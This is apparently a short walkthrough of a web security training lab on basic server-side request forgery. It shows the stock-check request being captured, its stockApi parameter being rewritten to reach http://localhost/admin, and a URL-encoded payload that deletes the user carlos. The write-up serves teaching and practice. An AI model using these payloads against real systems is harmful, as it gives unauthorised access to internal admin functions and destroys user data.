## Basic SSRF against the local server

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

## Notes

- /product/stock
- /resources/js/stockCheck.js
- admin panel
- login

## Resume

1. Capture `/product/stock` request
2. Try to access `http://localhost/admin`
3. Delete user Carlos

## Solve 

Capture `/product/stock` request :

```
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

Edit the request to try to access `http://localhost/admin` : 

```
stockApi=http%3a%2f%2flocalhost%2fadmin
```

The answer : 

```html
                   </header>
                    <header class="notification-header">
                    </header>
                    <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

Update the request with `http://localhost/admin/delete?username=carlos` and send it again to delete Carlos :

```
stockApi=http%3a%2f%2flocalhost%2fadmin%2fdelete%3fusername%3dcarlos
````